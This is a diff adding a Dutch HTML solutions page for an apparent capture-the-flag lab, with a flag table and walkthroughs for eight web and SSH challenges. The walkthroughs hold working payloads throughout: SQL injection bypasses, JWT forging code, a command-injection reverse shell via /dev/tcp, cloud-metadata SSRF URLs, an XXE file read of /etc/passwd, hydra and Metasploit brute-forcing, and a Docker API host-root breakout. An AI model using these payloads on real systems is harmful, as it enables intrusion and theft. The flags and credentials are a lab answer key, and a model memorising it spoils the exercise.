@@ -1,0 +1,523 @@
+<!doctype html>
+<html lang="nl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CTF Oplossingen</title>
+  <style>
+    :root { color-scheme: light dark; }
+    
+    /* BASE - Light mode (default) */
+    body { 
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; 
+      margin: 0; 
+      padding: 2rem; 
+      background: #ffffff;
+      color: #1f2937; 
+      line-height: 1.6; 
+    }
+    
+    .container { max-width: 900px; margin: 0 auto; }
+    
+    h1 { font-size: 2rem; margin-bottom: 0.5rem; color: #111827; }
+    h2 { font-size: 1.5rem; margin-top: 2rem; border-bottom: 2px solid #e5e7eb; padding-bottom: 0.5rem; color: #111827; }
+    h3 { font-size: 1.2rem; color: #2563eb; margin-top: 0; margin-bottom: 0.5rem; }
+    
+    /* Warning box - dark text for readability */
+    .warning { 
+      background: #fef3c7; 
+      border: 1px solid #f59e0b; 
+      border-radius: 12px; 
+      padding: 1rem 1.25rem; 
+      margin: 1rem 0; 
+      color: #92400e;
+    }
+    
+    /* Cards - white background, dark text */
+    .card { 
+      background: #ffffff; 
+      border: 1px solid #e5e7eb; 
+      border-radius: 12px; 
+      padding: 1.25rem; 
+      margin: 1rem 0; 
+      color: #111827;
+    }
+    .card p { color: #374151; }
+    .card strong { color: #111827; }
+    
+    /* Code styling */
+    code { 
+      background: #f3f4f6; 
+      color: #111827; 
+      padding: 0.15rem 0.35rem; 
+      border-radius: 4px; 
+      font-family: ui-monospace, monospace; 
+      font-size: 0.9em; 
+    }
+    pre { 
+      background: #1e293b; 
+      color: #e2e8f0; 
+      padding: 1rem; 
+      border-radius: 8px; 
+      overflow-x: auto; 
+      font-size: 0.9rem; 
+    }
+    pre code { background: transparent; padding: 0; color: #e2e8f0; }
+    
+    /* Table - dark text */
+    table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+    th, td { border: 1px solid #e5e7eb; padding: 0.75rem; text-align: left; color: #111827; }
+    th { background: #f3f4f6; color: #111827; font-weight: 600; }
+    
+    /* Badges */
+    .badge { display: inline-block; padding: 0.2rem 0.5rem; border-radius: 999px; font-size: 0.8rem; font-weight: 600; }
+    .easy { background: #d1fae5; color: #065f46; }
+    .medium { background: #fef3c7; color: #92400e; }
+    
+    /* Links */
+    a { color: #2563eb; }
+    .back-link { display: inline-block; margin-bottom: 1rem; color: #2563eb; text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    
+    /* Details/accordions */
+    details.section { margin: 0.75rem 0; border: 1px solid #e5e7eb; border-radius: 12px; padding: 0.75rem 1rem; background: #ffffff; }
+    details.section[open] { background: #f9fafb; }
+    details.section summary { 
+      cursor: pointer; 
+      font-weight: 600; 
+      color: #ffffff; 
+      background: #2563eb; 
+      border: 1px solid #1d4ed8; 
+      border-radius: 8px; 
+      padding: 0.5rem 0.75rem; 
+      display: inline-flex; 
+      align-items: center; 
+      gap: 0.45rem; 
+      user-select: none; 
+      transition: transform 0.05s ease, background-color 0.15s ease; 
+      list-style: none; 
+    }
+    details.section summary::-webkit-details-marker { display: none; }
+    details.section summary:hover { transform: translateY(-1px); background: #1e40af; border-color: #1e40af; }
+    details.section summary:focus-visible { outline: 3px solid #93c5fd; outline-offset: 2px; }
+    details.section[open] summary { margin-bottom: 0.5rem; }
+    details.section p { color: #374151; }
+    .caret { display: inline-block; transform: rotate(0deg); transition: transform 0.15s ease; }
+    details[open] .caret { transform: rotate(90deg); }
+    
+    /* Tool tags */
+    .tool-list { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 0.5rem 0; }
+    .tool { background: #dbeafe; color: #1e40af; padding: 0.25rem 0.6rem; border-radius: 6px; font-size: 0.85rem; }
+    
+    /* Top controls */
+    .details-controls { display: flex; gap: 0.5rem; flex-wrap: wrap; align-items: center; margin: 0.75rem 0 1rem; }
+    .button { 
+      display: inline-block; 
+      padding: 0.5rem 0.8rem; 
+      background: #2563eb; 
+      color: #ffffff; 
+      border: 1px solid #1d4ed8; 
+      border-radius: 8px; 
+      text-decoration: none; 
+      transition: transform 0.05s ease, background-color 0.15s ease; 
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .button:hover { transform: translateY(-1px); background: #1e40af; border-color: #1e40af; }
+    .button:focus-visible { outline: 3px solid #93c5fd; outline-offset: 2px; }
+    .button.secondary { background: #6b7280; border-color: #6b7280; }
+    .button.secondary:hover { background: #4b5563; border-color: #4b5563; }
+    
+    /* Footer */
+    .footer-text { text-align: center; margin-top: 2rem; color: #6b7280; }
+    
+    /* ========== DARK MODE ========== */
+    @media (prefers-color-scheme: dark) { 
+      body { background: #0b1220; color: #e5e7eb; } 
+      
+      h1, h2 { color: #f3f4f6; }
+      h2 { border-color: #374151; }
+      h3 { color: #60a5fa; }
+      
+      .warning { background: #422006; border-color: #a16207; color: #fef3c7; }
+      
+      .card { background: #111827; border-color: #263247; color: #e5e7eb; }
+      .card p { color: #d1d5db; }
+      .card strong { color: #f3f4f6; }
+      
+      code { background: #1e293b; color: #e2e8f0; }
+      pre { background: #0f172a; }
+      
+      th, td { border-color: #374151; color: #e5e7eb; }
+      th { background: #1f2937; color: #f3f4f6; }
+      
+      a, .back-link { color: #60a5fa; }
+      
+      details.section { background: #111827; border-color: #263247; }
+      details.section summary { background: #3b82f6; border-color: #2563eb; color: #ffffff; }
+      details.section[open] { background: #0f172a; }
+      details.section p { color: #d1d5db; }
+      
+      .tool { background: #1e3a5f; color: #93c5fd; }
+      
+      .footer-text { color: #9ca3af; }
+
+      .button { background: #3b82f6; border-color: #2563eb; }
+      .button:hover { background: #2563eb; border-color: #2563eb; }
+      .button.secondary { background: #6b7280; border-color: #6b7280; }
+      .button.secondary:hover { background: #4b5563; border-color: #4b5563; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="/" class="back-link">← Terug naar portaal</a>
+    
+    <h1>🏴‍☠️ CTF Oplossingen</h1>
+    
+    <div class="warning">
+      <strong>⚠️ SPOILER ALERT:</strong> Deze pagina bevat volledige walkthroughs voor alle challenges. Lees alleen als je vastloopt of je aanpak wilt verifiëren.
+    </div>
+
+    <div class="details-controls" aria-label="Oplossingen navigatie">
+      <button id="expandAll" class="button" type="button">Alles uitklappen</button>
+      <button id="collapseAll" class="button secondary" type="button">Alles inklappen</button>
+    </div>
+
+    <h2>Quick Reference: Flags</h2>
+    <table>
+      <thead>
+        <tr><th>Challenge</th><th>Poort</th><th>Flag</th><th>Level</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Login SQLi</td><td>8001</td><td><code>CTF{pwned_admin_via_sqli}</code></td><td><span class="badge easy">Easy</span></td></tr>
+        <tr><td>JWT Weak</td><td>8002</td><td><code>CTF{jwt_role_escalation}</code></td><td><span class="badge easy">Easy</span></td></tr>
+        <tr><td>Static Secrets</td><td>8003</td><td><code>CTF{follow_the_robots}</code></td><td><span class="badge easy">Easy</span></td></tr>
+        <tr><td>Command Injection</td><td>8004</td><td><code>CTF{rce_through_ping}</code></td><td><span class="badge medium">Medium</span></td></tr>
+        <tr><td>SSRF Internal</td><td>8005</td><td><code>CTF{ssrf_metadata_leak}</code></td><td><span class="badge medium">Medium</span></td></tr>
+        <tr><td>XML XXE</td><td>8006</td><td><code>CTF{xxe_file_disclosure}</code></td><td><span class="badge medium">Medium</span></td></tr>
+        <tr><td>SSH Brute Force</td><td>2222</td><td><code>CTF{brute_force_victory}</code></td><td><span class="badge medium">Medium</span></td></tr>
+        <tr><td>Container Breakout</td><td>8007</td><td><code>CTF{host_root_pwn}</code></td><td><span class="badge medium">Hacking God</span></td></tr>
+      </tbody>
+    </table>
+
+    <!-- BEGINNER CHALLENGES -->
+    <h2>Beginner Challenges</h2>
+
+    <!-- LOGIN SQLI -->
+    <div class="card">
+      <h3>1. Login SQLi (Poort 8001)</h3>
+      <p><strong>Kwetsbaarheid:</strong> SQL Injection in login formulier</p>
+      <div class="tool-list">
+        <span class="tool">sqlmap</span>
+        <span class="tool">Burp Suite</span>
+        <span class="tool">curl</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p>De applicatie bouwt SQL queries door user input direct te concateneren:</p>
+        <pre><code>query = f"SELECT username FROM users WHERE username = '{username}' AND password = '{password}'"</code></pre>
+        
+        <p><strong>Bypass authenticatie met:</strong></p>
+        <table>
+          <tr><th>Username</th><th>Password</th></tr>
+          <tr><td><code>admin' --</code></td><td>(leeg of willekeurig)</td></tr>
+          <tr><td><code>' OR '1'='1' --</code></td><td>(leeg)</td></tr>
+          <tr><td><code>admin'/*</code></td><td>(leeg)</td></tr>
+        </table>
+        
+        <p><strong>Waarom werkt het:</strong> De query wordt:</p>
+        <pre><code>SELECT username FROM users WHERE username = 'admin' --' AND password = ''</code></pre>
+        <p>De <code>--</code> maakt de password check commentaar.</p>
+        
+        <p><strong>Met sqlmap:</strong></p>
+        <pre><code>sqlmap -u "http://35.210.32.202:8001/login" --data="username=admin&password=test" --batch --dump</code></pre>
+      </details>
+    </div>
+
+    <!-- JWT WEAK -->
+    <div class="card">
+      <h3>2. JWT Weak Secret (Poort 8002)</h3>
+      <p><strong>Kwetsbaarheid:</strong> Zwakke/raadbare JWT signing secret</p>
+      <div class="tool-list">
+        <span class="tool">jwt.io</span>
+        <span class="tool">jwt_tool</span>
+        <span class="tool">Python PyJWT</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p><strong>Stap 1:</strong> Vraag een token aan:</p>
+        <pre><code>curl "http://35.210.32.202:8002/login?username=hacker"</code></pre>
+        
+        <p><strong>Stap 2:</strong> Bekijk de broncode (<code>/source</code>) — secret is <code>secret</code></p>
+        
+        <p><strong>Stap 3:</strong> Forge een admin token met Python:</p>
+        <pre><code>import jwt
+from datetime import datetime, timedelta
+
+payload = {
+    "sub": "hacker",
+    "role": "admin",  # Verander van "user" naar "admin"
+    "iat": datetime.utcnow(),
+    "exp": datetime.utcnow() + timedelta(hours=1)
+}
+token = jwt.encode(payload, "secret", algorithm="HS256")
+print(token)</code></pre>
+        
+        <p><strong>Stap 4:</strong> Gebruik het token:</p>
+        <pre><code>curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://35.210.32.202:8002/admin"</code></pre>
+      </details>
+    </div>
+
+    <!-- STATIC SECRETS -->
+    <div class="card">
+      <h3>3. Static Secrets (Poort 8003)</h3>
+      <p><strong>Kwetsbaarheid:</strong> Gevoelige bestanden onthuld via robots.txt</p>
+      <div class="tool-list">
+        <span class="tool">gobuster</span>
+        <span class="tool">dirb</span>
+        <span class="tool">curl</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p><strong>Stap 1:</strong> Check robots.txt:</p>
+        <pre><code>curl "http://35.210.32.202:8003/robots.txt"</code></pre>
+        <p>Output onthult: <code>Disallow: /config.bak</code></p>
+        
+        <p><strong>Stap 2:</strong> Verken de hidden directory:</p>
+        <pre><code>curl "http://35.210.32.202:8003/hidden/"</code></pre>
+        
+        <p><strong>Stap 3:</strong> Pak de flag:</p>
+        <pre><code>curl "http://35.210.32.202:8003/hidden/flag.txt"</code></pre>
+        
+        <p><strong>Met gobuster:</strong></p>
+        <pre><code>gobuster dir -u http://&lt;host&gt;:8003 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+      </details>
+    </div>
+
+    <!-- MEDIUM CHALLENGES -->
+    <h2>Medium Challenges</h2>
+
+    <!-- COMMAND INJECTION -->
+    <div class="card">
+      <h3>4. Command Injection (Poort 8004)</h3>
+      <p><strong>Kwetsbaarheid:</strong> OS Command Injection via ping utility</p>
+      <div class="tool-list">
+        <span class="tool">netcat</span>
+        <span class="tool">Burp Suite</span>
+        <span class="tool">commix</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p>De app voert <code>ping -c 2 {user_input}</code> uit met <code>shell=True</code>.</p>
+        
+        <p><strong>Test command chaining:</strong></p>
+        <pre><code>127.0.0.1; id
+127.0.0.1 && cat /flag.txt
+127.0.0.1 | cat /flag.txt
+$(cat /flag.txt)</code></pre>
+        
+        <p><strong>Reverse shell (geavanceerd):</strong></p>
+        <pre><code># Op je machine:
+nc -lvnp 4444
+
+# In het veld:
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;jouw-ip&gt;/4444 0&gt;&amp;1'</code></pre>
+        
+        <p><strong>Met commix:</strong></p>
+        <pre><code>commix -u "http://35.210.32.202:8004/" --data="host=127.0.0.1"</code></pre>
+      </details>
+    </div>
+
+    <!-- SSRF -->
+    <div class="card">
+      <h3>5. SSRF Internal (Poort 8005)</h3>
+      <p><strong>Kwetsbaarheid:</strong> Server-Side Request Forgery naar interne endpoints</p>
+      <div class="tool-list">
+        <span class="tool">curl</span>
+        <span class="tool">Burp Suite</span>
+        <span class="tool">SSRFmap</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p>De URL preview service valideert geen interne adressen.</p>
+        
+        <p><strong>Ontdek endpoints:</strong></p>
+        <pre><code>http://127.0.0.1:5000/api/endpoints</code></pre>
+        
+        <p><strong>Toegang tot interne admin:</strong></p>
+        <pre><code>http://127.0.0.1:5000/internal/admin
+http://127.0.0.1:5000/flag</code></pre>
+        
+        <p><strong>Cloud metadata (op GCP/AWS):</strong></p>
+        <pre><code># GCP
+http://metadata.google.internal/computeMetadata/v1/instance/
+
+# AWS
+http://169.254.169.254/latest/meta-data/</code></pre>
+      </details>
+    </div>
+
+    <!-- XXE -->
+    <div class="card">
+      <h3>6. XML XXE (Poort 8006)</h3>
+      <p><strong>Kwetsbaarheid:</strong> XML External Entity Injection</p>
+      <div class="tool-list">
+        <span class="tool">Burp Suite</span>
+        <span class="tool">XXEinjector</span>
+        <span class="tool">curl</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p>De XML parser staat external entities toe.</p>
+        
+        <p><strong>Payload om /flag.txt te lezen:</strong></p>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;role&gt;user&lt;/role&gt;
+&lt;/user&gt;</code></pre>
+        
+        <p><strong>Met curl:</strong></p>
+          <pre><code>curl -X POST -H "Content-Type: application/xml" \
+        -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;' \
+        "http://35.210.32.202:8006/api/import"</code></pre>
+        
+        <p><strong>/etc/passwd lezen:</strong></p>
+        <pre><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></pre>
+      </details>
+    </div>
+
+    <!-- SSH BRUTE -->
+    <div class="card">
+      <h3>7. SSH Brute Force (Poort 2222)</h3>
+      <p><strong>Kwetsbaarheid:</strong> Zwakke SSH credentials</p>
+      <div class="tool-list">
+        <span class="tool">hydra</span>
+        <span class="tool">nmap</span>
+        <span class="tool">Metasploit</span>
+        <span class="tool">medusa</span>
+      </div>
+      
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p><strong>Credentials:</strong> <code>ctfuser:password123</code></p>
+        
+        <p><strong>Met hydra:</strong></p>
+          <pre><code>hydra -l ctfuser -P /usr/share/wordlists/rockyou.txt \
+        -s 2222 ssh://35.210.32.202 -t 4 -V</code></pre>
+        
+        <p><strong>Met nmap:</strong></p>
+          <pre><code>nmap -p 2222 --script ssh-brute \
+        --script-args userdb=users.txt,passdb=passwords.txt 35.210.32.202</code></pre>
+        
+        <p><strong>Met Metasploit:</strong></p>
+        <pre><code>msfconsole
+use auxiliary/scanner/ssh/ssh_login
+      set RHOSTS 35.210.32.202
+set RPORT 2222
+set USERNAME ctfuser
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+run</code></pre>
+        
+        <p><strong>Login en pak de flag:</strong></p>
+        <pre><code>ssh ctfuser@35.210.32.202 -p 2222
+# Password: password123
+cat /home/ctfuser/flag.txt</code></pre>
+      </details>
+    </div>
+
+    <!-- HACKING GOD -->
+    <h2>Hacking God</h2>
+    <div class="card">
+      <h3>8. Container Breakout (Poort 8007)</h3>
+      <p><strong>Kwetsbaarheid:</strong> SSRF naar Docker Remote API (dind)</p>
+      <div class="tool-list">
+        <span class="tool">curl</span>
+        <span class="tool">jq</span>
+        <span class="tool">Burp Suite</span>
+      </div>
+
+      <details class="section">
+        <summary><span class="caret">▶</span> Bekijk oplossing</summary>
+        <p>De app biedt een fetcher die arbitraire HTTP-verzoeken uitvoert (inclusief POST) — een klassieke SSRF. Op het interne netwerk draait een Docker-in-Docker daemon op <code>http://dind-host:2375</code>.</p>
+
+        <p><strong>Stap 1:</strong> Test verbinding:</p>
+        <pre><code>curl "http://35.210.32.202:8007/fetch?url=http://dind-host:2375/_ping"</code></pre>
+        <p>Antwoord: <code>OK</code></p>
+
+        <p><strong>Stap 2:</strong> Maak een container die de host flag print:</p>
+<pre><code>curl -X POST "http://35.210.32.202:8007/fetch" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "method=POST" \
+  --data-urlencode "content_type=json" \
+  --data-urlencode "url=http://dind-host:2375/containers/create" \
+  --data-urlencode 'body={
+    "Image":"alpine",
+    "Cmd":["/bin/sh","-c","cat /mnt/host/root/host-flag.txt"],
+    "HostConfig":{
+      "Binds":["/:/mnt/host:ro"],
+      "Privileged":true
+    }
+  }'</code></pre>
+        <p>Noteer de <code>Id</code> uit de JSON response.</p>
+
+        <p><strong>Stap 3:</strong> Start de container:</p>
+          <pre><code>curl -X POST "http://35.210.32.202:8007/fetch" \
+  --data-urlencode "method=POST" \
+  --data-urlencode "url=http://dind-host:2375/containers/&lt;ID&gt;/start"</code></pre>
+
+        <p><strong>Stap 4:</strong> Haal de logs op (flag zichtbaar):</p>
+        <pre><code>curl "http://35.210.32.202:8007/fetch?url=http://dind-host:2375/containers/&lt;ID&gt;/logs?stdout=1"</code></pre>
+
+        <p><strong>Flag:</strong> <code>CTF{host_root_pwn}</code></p>
+
+        <p class="muted">Opmerking: dit is een gesimuleerde host (Docker-in-Docker). In echte omgevingen zou toegang tot <code>/var/run/docker.sock</code> of een onbeveiligde TCP API volledige host compromise betekenen.</p>
+      </details>
+    </div>
+
+    <h2>🛠️ Aanbevolen Tools</h2>
+    <div class="card">
+      <pre><code># Kali Linux / Parrot OS (meeste tools voorgeïnstalleerd)
+
+# Extra tools installeren
+sudo apt update
+sudo apt install -y hydra nmap sqlmap gobuster dirb nikto
+
+# Python tools
+pip3 install pyjwt requests
+
+# Metasploit
+sudo apt install -y metasploit-framework</code></pre>
+    </div>
+
+    <div class="warning" style="margin-top: 2rem;">
+      <strong>🎓 Ethisch Hacken:</strong> Deze challenges zijn ontworpen voor educatieve doeleinden in geïsoleerde omgevingen. Gebruik deze technieken nooit tegen systemen waar je geen expliciete toestemming voor hebt.
+    </div>
+
+    <p class="footer-text">
+      <strong>Happy Hacking! 🏴‍☠️</strong>
+    </p>
+  </div>
+</body>
+<script>
+  (function() {
+    const sections = Array.from(document.querySelectorAll('details.section'));
+    const expand = document.getElementById('expandAll');
+    const collapse = document.getElementById('collapseAll');
+    if (expand) expand.addEventListener('click', () => sections.forEach(d => d.open = true));
+    if (collapse) collapse.addEventListener('click', () => sections.forEach(d => d.open = false));
+  })();
+</script>
+</html>
